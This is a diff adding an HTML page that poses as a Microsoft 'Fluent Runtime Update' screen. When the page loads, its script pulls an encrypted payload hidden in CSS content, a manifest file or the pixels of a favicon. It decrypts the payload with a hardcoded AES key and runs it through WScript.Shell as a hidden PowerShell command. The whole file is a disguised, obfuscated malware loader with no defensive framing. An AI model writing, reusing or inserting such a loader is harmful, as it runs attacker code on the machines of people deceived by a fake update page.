@@ -1,0 +1,123 @@
+<!-- web/decrypt.html -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Fluent UI Runtime</title>
+  <link rel="stylesheet" href="style.css">
+  <style>
+    .center {
+      text-align: center;
+      margin-top: 15%;
+    }
+    .loader {
+      border: 6px solid #f3f3f3;
+      border-top: 6px solid #0078d4;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+      margin: 20px auto;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    .small {
+      font-size: 12px;
+      color: gray;
+    }
+  </style>
+</head>
+<body>
+  <div class="payload"></div>
+  <div class="center">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" height="48">
+    <h2>Applying Fluent Runtime Update...</h2>
+    <div class="loader"></div>
+    <div class="small">This update will complete automatically. Do not close this window.</div>
+  </div>
+
+  <script>
+    (async () => {
+      async function aesDecrypt(b64Cipher, hexIV, keyStr) {
+        const iv = Uint8Array.from(hexIV.match(/.{2}/g).map(byte => parseInt(byte, 16)));
+        const keyBytes = new TextEncoder().encode(keyStr);
+        const key = await crypto.subtle.importKey("raw", keyBytes, "AES-CBC", false, ["decrypt"]);
+        const data = Uint8Array.from(atob(b64Cipher), c => c.charCodeAt(0));
+        const decrypted = await crypto.subtle.decrypt({name: "AES-CBC", iv}, key, data);
+        return new TextDecoder().decode(decrypted);
+      }
+
+      function getPayloadFromCSS() {
+        try {
+          const css = getComputedStyle(document.querySelector(".payload"), "::after").content;
+          return css ? css.replace(/^\"|\"$/g, "") : null;
+        } catch (e) {
+          return null;
+        }
+      }
+
+      async function getPayloadFromManifest() {
+        try {
+          const res = await fetch("manifest.json");
+          const json = await res.json();
+          if (json.payload?.iv && json.payload?.chunks) {
+            return `${json.payload.iv}:${json.payload.chunks.join("")}`;
+          }
+        } catch {}
+        return null;
+      }
+
+      async function getPayloadFromPNG() {
+        return new Promise((resolve) => {
+          const img = new Image();
+          img.src = "favicon.png";
+          img.crossOrigin = "anonymous";
+          img.onload = () => {
+            const canvas = document.createElement("canvas");
+            canvas.width = img.width;
+            canvas.height = img.height;
+            const ctx = canvas.getContext("2d");
+            ctx.drawImage(img, 0, 0);
+            const data = ctx.getImageData(0, 0, canvas.width, canvas.height).data;
+
+            let bits = [];
+            for (let i = 0; i < data.length; i += 4) {
+              bits.push(data[i] & 1);
+              bits.push(data[i + 1] & 1);
+              bits.push(data[i + 2] & 1);
+            }
+
+            let bytes = [];
+            for (let i = 0; i < bits.length; i += 8) {
+              const byte = bits.slice(i, i + 8).join("");
+              if (byte === "00000000") break;
+              bytes.push(String.fromCharCode(parseInt(byte, 2)));
+            }
+
+            resolve(bytes.join(""));
+          };
+        });
+      }
+
+      let encrypted = getPayloadFromCSS();
+      if (!encrypted) encrypted = await getPayloadFromManifest();
+      if (!encrypted) encrypted = await getPayloadFromPNG();
+
+      if (!encrypted) return;
+
+      const HARDCODED_KEY = "Zxcvbnm1234567890Zxcvbnm1234567890";
+
+      try {
+        const [iv, b64] = encrypted.split(":");
+        const decrypted = await aesDecrypt(b64, iv, HARDCODED_KEY);
+        const shell = new ActiveXObject("WScript.Shell");
+        shell.Run("powershell -nop -w hidden -c " + '"' + decrypted + '"');
+      } catch (e) {
+        console.error("Decrypt failed:", e);
+      }
+    })();
+  </script>
+</body>
+</html>
